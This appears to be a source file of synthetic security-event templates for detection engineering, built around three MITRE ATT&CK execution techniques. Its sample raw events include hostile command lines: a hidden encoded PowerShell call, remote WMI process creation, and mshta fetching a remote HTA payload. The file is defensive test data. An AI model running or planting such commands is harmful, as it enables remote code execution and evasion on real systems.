/**
 * Execution Event Templates (MITRE Tactic: Execution - TA0002)
 */

export const executionTemplates = [
  {
    templateId: "EXEC_POWERSHELL_ENCODED_01",
    name: "Encoded PowerShell Execution",
    source: "WindowsEventLog",
    provider: "Microsoft",
    product: "Windows PowerShell",
    category: "execution",
    severity: "high",
    confidence: 90,
    mitreTechnique: {
      id: "T1059.001",
      name: "PowerShell",
      tactic: "Execution"
    },
    detectionRule: {
      ruleId: "RULE-PS-ENCODED",
      ruleName: "Encoded Base64 PowerShell Execution",
      mitreId: "T1059.001",
      threshold: "powershell.exe with -enc or -e parameter",
      confidence: 90,
      ruleVersion: "2.0",
      author: "ExplainSec Detection Engineering"
    },
    description: "PowerShell executed with obfuscated base64 encoded command arguments",
    rawEvent: JSON.stringify({
      EventID: 4104,
      ScriptBlockText: "powershell.exe -nop -w hidden -enc aW52b2tlLWV4cHJlc3Npb24...",
      Path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    })
  },
  {
    templateId: "EXEC_WMI_EXECUTION_01",
    name: "WMI Command Invocation",
    source: "DefenderForEndpoint",
    provider: "Microsoft",
    product: "Defender EDR",
    category: "execution",
    severity: "medium",
    confidence: 82,
    mitreTechnique: {
      id: "T1047",
      name: "Windows Management Instrumentation",
      tactic: "Execution"
    },
    detectionRule: {
      ruleId: "RULE-WMI-EXEC-01",
      ruleName: "WMI Process Creation on Target Host",
      mitreId: "T1047",
      threshold: "wmic.exe process call create",
      confidence: 82,
      ruleVersion: "1.5",
      author: "ExplainSec Detection Engineering"
    },
    description: "WMI command line utility spawned process remotely via WMI provider host",
    rawEvent: JSON.stringify({
      ProcessName: "wmic.exe",
      CommandLine: "wmic.exe /node:192.168.1.105 process call create 'cmd.exe /c calc.exe'"
    })
  },
  {
    templateId: "EXEC_MSHTA_PAYLOAD_01",
    name: "MSHTA Remote Script Execution",
    source: "CrowdStrikeFalcon",
    provider: "CrowdStrike",
    product: "Falcon EDR",
    category: "execution",
    severity: "high",
    confidence: 92,
    mitreTechnique: {
      id: "T1218.005",
      name: "Mshta",
      tactic: "Defense Evasion / Execution"
    },
    detectionRule: {
      ruleId: "RULE-MSHTA-URL-01",
      ruleName: "MSHTA Executing Remote HTA Payload",
      mitreId: "T1218.005",
      threshold: "mshta.exe executing http/https URL",
      confidence: 92,
      ruleVersion: "1.2",
      author: "ExplainSec Threat Intel"
    },
    description: "Microsoft HTA utility fetched and executed remote payload bypassing application controls",
    rawEvent: JSON.stringify({
      ImageFileName: "mshta.exe",
      CommandLine: "mshta.exe http://198.51.100.42/payload.hta"
    })
  }
];
